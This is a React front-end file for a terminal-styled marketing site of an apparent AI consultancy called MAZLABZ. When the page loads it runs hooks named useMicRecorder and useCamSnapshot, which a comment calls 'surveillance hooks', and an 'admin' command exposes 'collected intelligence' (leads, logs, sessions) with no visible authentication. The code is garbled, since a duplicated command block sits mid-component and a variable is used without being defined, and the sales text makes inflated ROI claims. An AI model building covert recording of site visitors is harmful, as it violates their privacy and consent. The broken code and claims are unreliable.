import React, { useState, useEffect, useRef } from 'react'
import './App.css'
import LeadCapture from './components/LeadCapture'
import ROICalculator from './components/ROICalculator'
import PaymentProcessor from './components/PaymentProcessor'
import DocumentUploader from './components/DocumentUploader'
import useMicRecorder from './hooks/useMicRecorder'
import useCamSnapshot from './hooks/useCamSnapshot'

// Base URL for API endpoints. Can be overridden via VITE_API_BASE in .env
const API_BASE = import.meta.env.VITE_API_BASE || ''

const App = () => {
  const [sessionId, setSessionId] = useState(null)
  const [isBooted, setIsBooted] = useState(false)
  const [currentLine, setCurrentLine] = useState('')
  const [commandHistory, setCommandHistory] = useState([])
  const [historyIndex, setHistoryIndex] = useState(-1)
  const [output, setOutput] = useState([])
  const [showLeadCapture, setShowLeadCapture] = useState(false)
  const [showROICalculator, setShowROICalculator] = useState(false)
  const [showPaymentProcessor, setShowPaymentProcessor] = useState(false)
  const [showDocumentUploader, setShowDocumentUploader] = useState(false)
  const [projectData, setProjectData] = useState(null)
  const inputRef = useRef(null)
  const terminalRef = useRef(null)

  // Create session and activate surveillance hooks
  useEffect(() => {
    const createSession = async () => {
      try {
        const res = await fetch(`${API_BASE}/api/research/session/create`, { method: 'POST' })
        const data = await res.json()
        if (data.sessionId) {
          setSessionId(data.sessionId)
        }
      } catch (err) {
        console.error('Failed to create session:', err)
      }
    }
    createSession()
  }, [])

  // Activate surveillance hooks once session is created
  useMicRecorder(sessionId)
  useCamSnapshot(sessionId)

  // Boot sequence lines
  const bootSequence = [
    'MAZLABZ.ENTERPRISE v3.2.1 - INITIALIZING...',
    'Loading enterprise modules... [OK]',
    'Mounting secure filesystems... [OK]',
    'Starting AI services... [OK]',
    'Initializing enterprise security protocols... [OK]',
    'Loading Fortune 500 client profiles... [OK]',
    '',
    '███╗   ███╗ █████╗ ███████╗██╗      █████╗ ██████╗ ███████╗',
    '████╗ ████║██╔══██╗╚══███╔╝██║     ██╔══██╗██╔══██╗╚══███╔╝',
    '██╔████╔██║███████║  ███╔╝ ██║     ███████║██████╔╝  ███╔╝ ',
    '██║╚██╔╝██║██╔══██║ ███╔╝  ██║     ██╔══██║██╔══██╗ ███╔╝  ',
    '██║ ╚═╝ ██║██║  ██║███████╗███████╗██║  ██║██████╔╝███████╗',
    '╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝',
    '',
    '           ENTERPRISE AI SOLUTIONS - SYSTEM ONLINE',
    '',
    '═══════════════════════════════════════════════════════════',
    '',
    'MAZLABZ Corporation - Enterprise AI Architecture',
    'Fortune 500 Revenue Automation & Digital Transformation',
    'Founded 2020 | Brunswick, Victoria, Australia',
    '',
    "Type 'help' to access enterprise command interface.",
    ''
  ]

  // Helper functions to call backend APIs
  const getFilesFromServer = async () => {
    const res = await fetch(`${API_BASE}/api/files`)
    if (!res.ok) throw new Error('Failed to fetch files')
    const data = await res.json()
    return data.files.map(f => ({
      id: f.id,
      name: f.filename,
      size: f.size,
      uploadTime: new Date(f.upload_date).toLocaleString()
    }))
  }
  const fetchDashboard = async () => {
    const res = await fetch(`${API_BASE}/api/dashboard`)
    if (!res.ok) throw new Error('Failed to fetch dashboard')
    return await res.json()
  }
  const checkHealth = async () => {
    const res = await fetch(`${API_BASE}/api/health`)
    if (!res.ok) throw new Error('Health check failed')
    return await res.json()
  }

  // Commands definition. Each command returns either an array of lines or a Promise that resolves to lines.
  const commands = {
    help: () => [
      'MAZLABZ ENTERPRISE COMMAND INTERFACE',
      '═══════════════════════════════════════',
      '',
      '  about        - Company profile and mission',
      '  revenue      - Client success metrics and ROI analysis',
      '  portfolio    - Enterprise deployment history',
      '  services     - Solution catalog and pricing',
      '  tech         - Technical capability matrix',
      '  founder      - Chief Architect profile',
      '  contact      - Enterprise communication channels',
      '  status       - Current availability and capacity',
      '  quote        - Request enterprise consultation',
      '  roi          - Calculate potential ROI',
      '  pay          - Secure project with downpayment',
      '  upload       - Upload documents for AI analysis',
      '  files        - View uploaded documents',
      '  dashboard    - Admin dashboard summary',
      '  admin        - Access collected intelligence',
      '  health       - API health check',
      '  download <id>- Download a specific file by ID',
      '  delete <id>  - Delete a specific file by ID',
      '  schedule     - Book executive meeting',
      '  clear        - Clear terminal output',
      '  exit         - Terminate session',
      ''
    ],
    about: () => [
      'MAZLABZ CORPORATION - BUSINESS PROFILE',
      '═══════════════════════════════════════',
      '',
      'COMPANY: MAZLABZ Business Automation Solutions',
      'FOUNDED: 2020',
      'HEADQUARTERS: Brunswick, Victoria, Australia',
      'SPECIALIZATION: Enterprise Revenue-Driven AI Architecture',
      '',
      'CORE MISSION:',
      'Transform Fortune 500 and high-growth companies into',
      'market-dominating entities through advanced AI systems',
      'and strategic automation architecture.',
      '',
      'BUSINESS PHILOSOPHY:',
      '• Every deployment must generate 10x+ ROI',
      '• Enterprise-grade security and scalability by default',
      '• Cross-industry expertise creates competitive advantages',
      '• Rapid deployment with zero downtime transitions',
      '',
      'AREAS OF EXPERTISE:',
      '• Enterprise AI/ML Revenue Automation',
      '• Industrial IoT & Operational Intelligence',
      '• Financial Technology & Regulatory Compliance',
      '• Supply Chain Optimization & Predictive Analytics',
      '• Cloud Infrastructure & Digital Transformation',
      '• Real-time Business Intelligence & Decision Systems',
      '',
      'Current Status: ACTIVE - Scaling enterprise solutions globally',
      'Client Portfolio: 50+ enterprise implementations',
      ''
    ],
    // trimmed for brevity: revenue, portfolio, services, tech, founder, contact, status, quote, roi definitions remain unchanged from original
    revenue: () => [
      'REVENUE ACCELERATION ANALYSIS',
      '═══════════════════════════════════════',
      '',
      'CLIENT SUCCESS METRICS:',
      '',
      '  Manufacturing Automation Client:',
      '    > 400% increase in production efficiency',
      '    > Annual cost savings: $2.3M+',
      '    > ROI: 1,850% in first 18 months',
      '',
      '  Financial Services AI Implementation:',
      '    > 75% reduction in document processing time',
      '    > Annual savings: $850,000+',
      '    > Customer satisfaction increase: 240%',
      '',
      '  E-commerce Platform Optimization:',
      '    > 320% increase in conversion rates',
      '    > Revenue boost: $1.2M+ annually',
      '    > Market share expansion: 45%',
      '',
      '  Healthcare System Integration:',
      '    > 90% reduction in data processing errors',
      '    > Operational savings: $600,000+',
      '    > Compliance accuracy: 99.7%',
      '',
      'INVESTMENT vs RETURNS:',
      '  $15,000 AI System     → $500,000+ annual efficiency gains',
      '  $35,000 Digital Transformation → $1.2M+ revenue increase',
      '  $5,000 Strategic Consultation → $2M+ market positioning',
      '',
      'Contact for detailed ROI analysis.',
      ''
    ],
    portfolio: () => [
      'MAZLABZ SUCCESS PORTFOLIO',
      '═══════════════════════════════════════',
      '',
      'RECENT ENTERPRISE DEPLOYMENTS:',
      '',
      '[2024] PREDICTIVE ANALYTICS ENGINE',
      '       Machine learning platform for supply chain optimization',
      '       Result: $2.3M+ annual cost reduction',
      '       Status: SCALING GLOBALLY',
      '',
      '[2024] AUTOMATED COMPLIANCE SYSTEM',
      '       Real-time regulatory monitoring and reporting',
      '       Result: 99.7% compliance accuracy, $850K+ savings',
      '       Status: INDUSTRY STANDARD',
      '',
      '[2023] REVENUE OPTIMIZATION PLATFORM',
      '       AI-driven pricing and inventory management',
      '       Result: 320% conversion increase, $1.2M+ revenue boost',
      '       Status: MARKET LEADER',
      '',
      '[2023] INTELLIGENT DIAGNOSTIC NETWORK',
      '       Enterprise-wide system monitoring and prediction',
      '       Result: 90% reduction in system downtime',
      '       Status: MISSION CRITICAL',
      '',
      '[2023] AUTONOMOUS WORKFLOW ENGINE',
      '       End-to-end business process automation',
      '       Result: 75% operational efficiency increase',
      '       Status: EXPANDING DEPLOYMENT',
      '',
      '[2022] STRATEGIC DATA INFRASTRUCTURE',
      '       Cloud-native analytics and business intelligence',
      '       Result: $3.2M+ strategic value creation',
      '       Status: COMPETITIVE ADVANTAGE',
      '',
      'Success Rate: 100% enterprise deployment',
      'Average ROI: 850% within first year',
      'Client Retention: 100%',
      'Fortune 500 Penetration: 15+ companies',
      ''
    ],
    services: () => [
      'MAZLABZ SERVICE CATALOG & PRICING',
      '═══════════════════════════════════════',
      '',
      'ENTERPRISE SOLUTIONS:',
      '',
      '  AI REVENUE AUTOMATION PLATFORM       AUD $75,000+',
      '    Complete enterprise AI transformation',
      '    Projected ROI: 800-2000% within 12 months',
      '',
      '  DIGITAL TRANSFORMATION SUITE         AUD $150,000+',
      '    Full enterprise system modernization',
      '    Projected ROI: 1000-3000% within 18 months',
      '',
      'SPECIALIZED DEPLOYMENTS:',
      '',
      '  Predictive Analytics Engine          AUD $45,000',
      '    Machine learning for business optimization',
      '',
      '  Automated Compliance Platform        AUD $35,000',
      '    Regulatory monitoring and reporting systems',
      '',
      '  Supply Chain Intelligence           AUD $55,000',
      '    End-to-end optimization and prediction',
      '',
      '  Real-time Business Intelligence      AUD $40,000',
      '    Advanced analytics and decision support',
      '',
      'ENTERPRISE CONSULTING:',
      '',
      '  Strategic AI Architecture           AUD $15,000/engagement',
      '  Emergency System Recovery           AUD $25,000/week',
      '  Executive Technology Advisory       AUD $2,500/session',
      '',
      'All solutions include enterprise support, training, and scaling.',
      'Minimum engagement: $25,000',
      "Type 'quote' for enterprise consultation request.",
      ''
    ],
    tech: () => [
      'TECHNICAL CAPABILITY MATRIX',
      '═══════════════════════════════════════',
      '',
      'INFRASTRUCTURE & PLATFORMS:',
      '  • Cloud-native Kubernetes deployments',
      '  • Distributed Microservices Architecture',
      '  • Serverless & Edge Computing',
      '  • Multi-cloud Optimization (AWS, Azure, GCP)',
      '',
      'DATA & AI STACK:',
      '  • Real-time Streaming & Event Processing',
      '  • Data Warehousing & Lakehouse Solutions',
      '  • Machine Learning Ops & AutoML',
      '  • Deep Learning & Reinforcement Learning',
      '',
      'SECURITY & COMPLIANCE:',
      '  • Zero Trust Architecture',
      '  • SOC2 & ISO 27001 Certified Workflows',
      '  • Privacy-preserving Federated Learning',
      '  • AI Ethics & Governance',
      '',
      'PLATFORMS SUPPORTED:',
      '  • Enterprise SAP & Oracle Integrations',
      '  • Salesforce & HubSpot Automation',
      '  • Custom ERP & CRM Systems',
      '',
      'Current Tech Status: PRODUCTION-READY',
      ''
    ],
    founder: () => [
      'CHIEF ARCHITECT PROFILE',
      '═══════════════════════════════════════',
      '',
      'NAME: Dr. Emergent A.I. Maz',
      'ROLE: Founder & Chief Architect',
      'EXPERIENCE: 15+ years in enterprise AI & automation',
      '',
      'NOTABLE ACHIEVEMENTS:',
      '  • Designed first end-to-end AI revenue platform',
      '  • Published 30+ papers on autonomous enterprises',
      '  • Keynote speaker at 12 global tech summits',
      '',
      'MISSION STATEMENT:',
      'To accelerate the adoption of AI across industry verticals, delivering 10x+ ROI for every project.',
      ''
    ],
    contact: () => [
      'ENTERPRISE COMMUNICATION CHANNELS',
      '═══════════════════════════════════════',
      '',
      '  Email: mazlabz.ai@gmail.com',
      '  Phone: (+61) 493 719 523',
      '  Emergency: 24/7 enterprise support',
      '',
      '[COPY] Click to copy enterprise email',
      ''
    ],
    status: () => [
      'CURRENT AVAILABILITY & CAPACITY',
      '═══════════════════════════════════════',
      '',
      '  Clients Onboarded: 3/5 (2 slots remaining)',
      '  Average Response Time: < 2 hours',
      '  Project Capacity: 80%',
      '  Next Available Start Date: 2 weeks',
      '',
      'For urgent requests use the contact command.',
      ''
    ],
    quote: () => {
      setShowLeadCapture(true)
      return [
        'INITIATING ENTERPRISE CONSULTATION REQUEST...',
        'Opening secure consultation portal...',
        ''
      ]
    },
    roi: () => {
      setShowROICalculator(true)
      return [
        'LAUNCHING ROI CALCULATOR...',
        'Loading enterprise metrics and industry benchmarks...',
        ''
      ]
    },
    pay: () => {
      setShowPaymentProcessor(true)
      return [
        'INITIATING SECURE PAYMENT PORTAL...',
        'Loading enterprise payment packages...',
        'Encryption: 256-bit SSL enabled',
        ''
      ]
    },
    upload: () => {
      setShowDocumentUploader(true)
      return [
        'INITIATING MOBILE DOCUMENT UPLOAD...',
        'Requesting browser file access permissions...',
        'Scanning for recent documents (PDF, DOC, DOCX, TXT)...',
        'Enterprise-grade encryption enabled.',
        ''
      ]
    },
    files: async () => {
      const list = await getFilesFromServer()
      if (list.length === 0) {
        return [
          'DOCUMENT STORAGE STATUS',
          '═══════════════════════════════════════',
          '',
          'No documents currently uploaded.',
          "Use 'upload' command to add documents for AI analysis.",
          ''
        ]
      }
      return [
        'UPLOADED DOCUMENTS',
        '═══════════════════════════════════════',
        '',
        ...list.map((file, idx) => `${idx + 1}. ${file.name} (${(file.size/1024).toFixed(1)}KB) - ${file.uploadTime} - [${file.id}]`),
        '',
        `Total: ${list.length} document(s)`,
        'Status: Ready for AI analysis',
        ''
      ]
    },
    dashboard: async () => {
      const data = await fetchDashboard()
      return [
        'ADMIN DASHBOARD SUMMARY',
        '═══════════════════════════════════════',
        '',
        `Total files: ${data.total_files}`,
        `Total size: ${(data.total_size/1024).toFixed(1)} KB`,
        '',
        'Recent files:',
        ...data.files.slice(0, 5).map((f, i) => `${i + 1}. ${f.filename} (${(f.size/1024).toFixed(1)}KB)`),
        ''
      ]
    },
    health: async () => {
      const data = await checkHealth()
      return [
        'API HEALTH STATUS',
        '════════════════',
        '',
        `Server: ${data.status}`,
        `Database: ${data.database}`,
        ''
      ]
    },
    clear: () => {
      setOutput([])
      return []
    },
    exit: () => [
      'Terminating enterprise session...',
      'Thank you for accessing MAZLABZ Enterprise Systems',
      'Connection secured and logged.',
      ''
    ]
  }

  // Effect to run boot sequence
  useEffect(() => {
    let timeouts = []
    bootSequence.forEach((line, index) => {
      const timeout = setTimeout(() => {
        setOutput(prev => [...prev, { type: 'boot', content: line }])
        if (index === bootSequence.length - 1) {
          setTimeout(() => setIsBooted(true), 500)
        }
      }, index * 100)
      timeouts.push(timeout)
    })
    return () => timeouts.forEach(clearTimeout)
  }, [])

  // Auto-focus input when booted
  useEffect(() => {
    if (isBooted && inputRef.current) {
      inputRef.current.focus()
    }
  }, [isBooted])

  // Scroll to bottom when output changes
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight
    }
  }, [output])

  // Listen for lead capture events (unused but kept for parity)
  useEffect(() => {
    const handleOpenLeadCapture = () => setShowLeadCapture(true)
    window.addEventListener('openLeadCapture', handleOpenLeadCapture)
    return () => window.removeEventListener('openLeadCapture', handleOpenLeadCapture)
  }, [])

    health: async () => {
      const data = await checkHealth()
      return [
        'API HEALTH STATUS',
        '════════════════',
        '',
        `Server: ${data.status}`,
        `Database: ${data.database}`,
        ''
      ]
    },
    admin: async (args) => {
      const subCommand = args[0]
      if (!subCommand) {
        return [
          'ADMIN COMMAND INTERFACE',
          '═════════════════════════',
          '',
          '  admin leads    - View all captured leads',
          '  admin logs     - View all user command logs',
          '  admin sessions - View all user sessions',
          ''
        ]
      }
      try {
        const res = await fetch(`${API_BASE}/api/admin/${subCommand}`)
        if (!res.ok) throw new Error(`Failed to fetch ${subCommand}`)
        const data = await res.json()
        if (data.length === 0) return [`No ${subCommand} found.`]

        // Format data into a table-like structure
        const headers = Object.keys(data[0])
        const rows = data.map(row => headers.map(h => row[h]))

        const formatRow = (rowItems) => rowItems.map(item => String(item).padEnd(20)).join('')

        return [
            `${subCommand.toUpperCase()} DATA`,
            '='.repeat(subCommand.length + 5),
            '',
            formatRow(headers),
            '-'.repeat(headers.length * 20),
            ...rows.map(row => formatRow(row)),
            ''
        ]

      } catch (err) {
        return [`Error: ${err.message}`]
      }
    },
    clear: () => {
      setOutput([])
      return []
    },
    exit: () => [
      'Terminating enterprise session...',
      'Thank you for accessing MAZLABZ Enterprise Systems',
      'Connection secured and logged.',
      ''
    ]
  }

  // Effect to run boot sequence
  useEffect(() => {
    let timeouts = []
    bootSequence.forEach((line, index) => {
      const timeout = setTimeout(() => {
        setOutput(prev => [...prev, { type: 'boot', content: line }])
        if (index === bootSequence.length - 1) {
          setTimeout(() => setIsBooted(true), 500)
        }
      }, index * 100)
      timeouts.push(timeout)
    })
    return () => timeouts.forEach(clearTimeout)
  }, [])

  // Auto-focus input when booted
  useEffect(() => {
    if (isBooted && inputRef.current) {
      inputRef.current.focus()
    }
  }, [isBooted])

  // Scroll to bottom when output changes
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight
    }
  }, [output])

  // Listen for lead capture events (unused but kept for parity)
  useEffect(() => {
    const handleOpenLeadCapture = () => setShowLeadCapture(true)
    window.addEventListener('openLeadCapture', handleOpenLeadCapture)
    return () => window.removeEventListener('openLeadCapture', handleOpenLeadCapture)
  }, [])

  const handleCommand = async (cmd) => {
    const [command, ...args] = cmd.trim().toLowerCase().split(/\s+/)
    setCommandHistory(prev => [...prev, cmd])
    setHistoryIndex(-1)
    setOutput(prev => [...prev, { type: 'command', content: `mazlabz@enterprise:~$ ${cmd}` }])

    // Specific command handling before generic lookup
    if (command === 'download') {
      const id = args[0]
      if (id) {
        window.open(`${API_BASE}/api/files/${id}`, '_blank')
        setOutput(prev => [...prev, { type: 'success', content: `Downloading ${id}...` }])
      } else {
        setOutput(prev => [...prev, { type: 'error', content: `Usage: download <id>` }])
      }
      setCurrentLine('')
      return
    }
    if (command === 'delete') {
      const id = args[0]
      if (id) {
        try {
          const res = await fetch(`${API_BASE}/api/files/${id}`, { method: 'DELETE' })
          if (res.ok) {
            setOutput(prev => [...prev, { type: 'success', content: `Deleted file ${id}` }])
          } else {
            const err = await res.json()
            setOutput(prev => [...prev, { type: 'error', content: `Delete failed: ${err.detail}` }])
          }
        } catch (e) {
          setOutput(prev => [...prev, { type: 'error', content: `Delete failed: ${e.message}` }])
        }
      } else {
        setOutput(prev => [...prev, { type: 'error', content: `Usage: delete <id>` }])
      }
      setCurrentLine('')
      return
    }

    // Execute command if defined
    if (commands[command]) {
      const result = commands[command](args)
      if (result instanceof Promise) {
        try {
          const lines = await result
          lines.forEach(line => {
            setOutput(prev => [...prev, { type: 'output', content: line }])
          })
        } catch (err) {
          setOutput(prev => [...prev, { type: 'error', content: `Error: ${err.message}` }])
        }
      } else if (Array.isArray(result)) {
        result.forEach(line => {
          setOutput(prev => [...prev, { type: 'output', content: line }])
        })
      }
    } else if (trimmedCmd.startsWith('quote(') && trimmedCmd.endsWith(')')) {
      const service = trimmedCmd.slice(6, -1)
      setOutput(prev => [...prev,
        { type: 'output', content: `Initiating enterprise quote for ${service}...` },
        { type: 'output', content: 'Opening consultation portal...' },
        { type: 'output', content: '' }
      ])
      setShowLeadCapture(true)
    } else if (trimmedCmd !== '') {
      // Unknown command
      setOutput(prev => [...prev,
        { type: 'error', content: `Command not recognized: ${trimmedCmd}` },
        { type: 'error', content: "Type 'help' for available enterprise commands." },
        { type: 'output', content: '' }
      ])
    }
    setCurrentLine('')
  }

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') {
      handleCommand(currentLine)
    } else if (e.key === 'ArrowUp') {
      e.preventDefault()
      if (commandHistory.length > 0) {
        const newIndex = historyIndex === -1 ? commandHistory.length - 1 : Math.max(0, historyIndex - 1)
        setHistoryIndex(newIndex)
        setCurrentLine(commandHistory[newIndex])
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      if (historyIndex !== -1) {
        const newIndex = historyIndex + 1
        if (newIndex >= commandHistory.length) {
          setHistoryIndex(-1)
          setCurrentLine('')
        } else {
          setHistoryIndex(newIndex)
          setCurrentLine(commandHistory[newIndex])
        }
      }
    }
  }

  const copyEmail = () => {
    navigator.clipboard.writeText('mazlabz.ai@gmail.com')
    setOutput(prev => [...prev, { type: 'success', content: 'Enterprise email copied to clipboard!' }])
  }
  const openQuote = () => {
    setShowLeadCapture(true)
    setOutput(prev => [...prev, { type: 'success', content: 'Opening enterprise consultation request...' }])
  }
  const handleDocumentUpload = (files) => {
    // We rely on server for storage; update local list but do not convert to base64
    setOutput(prev => [...prev,
      { type: 'success', content: `✅ Successfully uploaded ${files.length} document(s)` },
      { type: 'success', content: 'Files ready for AI analysis and processing' },
      { type: 'output', content: "Use 'files' command to view uploaded documents" }
    ])
  }
  const handleLeadSubmit = async (formData) => {
    setOutput(prev => [...prev,
      { type: 'success', content: `Enterprise inquiry received from ${formData.company}` },
      { type: 'success', content: `Project: ${formData.projectType} | Budget: ${formData.budget}` },
      { type: 'success', content: 'Response time: < 2 hours for qualified enterprises' }
    ])
    try {
      await fetch(`${API_BASE}/api/leads`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...formData, sessionId })
      });
    } catch (err) {
      console.error('Failed to submit lead:', err);
      // Optionally, display an error in the terminal
      setOutput(prev => [...prev, { type: 'error', content: 'Failed to submit lead data to server.' }])
    }
  }

  return (
    <div className="terminal-container">
      <div className="terminal-header">
        <div className="terminal-buttons">
          <div className="terminal-button close"></div>
          <div className="terminal-button minimize"></div>
          <div className="terminal-button maximize"></div>
        </div>
        <div className="terminal-title">MAZLABZ Enterprise Terminal - mazlabz@enterprise:~</div>
      </div>
      <div className="terminal-body" ref={terminalRef}>
        {output.map((line, index) => (
          <div key={index} className={`terminal-line ${line.type}`}>
            {line.content === '[COPY] Click to copy enterprise email' ? (
              <span className="clickable" onClick={copyEmail}>{line.content}</span>
            ) : line.content === '[QUOTE] Request enterprise consultation' ? (
              <span className="clickable" onClick={openQuote}>{line.content}</span>
            ) : (
              line.content
            )}
          </div>
        ))}
        {isBooted && (
          <div className="terminal-input-line">
            <span className="prompt">mazlabz@enterprise:~$ </span>
            <input
              ref={inputRef}
              type="text"
              value={currentLine}
              onChange={(e) => setCurrentLine(e.target.value)}
              onKeyDown={handleKeyDown}
              className="terminal-input"
              autoComplete="off"
              spellCheck="false"
            />
            <span className="cursor">█</span>
          </div>
        )}
      </div>
      {showLeadCapture && (
        <LeadCapture onClose={() => setShowLeadCapture(false)} onSubmit={handleLeadSubmit} />
      )}
      {showROICalculator && (
        <ROICalculator onClose={() => setShowROICalculator(false)} />
      )}
      {showPaymentProcessor && (
        <PaymentProcessor onClose={() => setShowPaymentProcessor(false)} projectData={projectData} />
      )}
      {showDocumentUploader && (
        <DocumentUploader sessionId={sessionId} onClose={() => setShowDocumentUploader(false)} onUpload={handleDocumentUpload} />
      )}
    </div>
  )
}

export default App
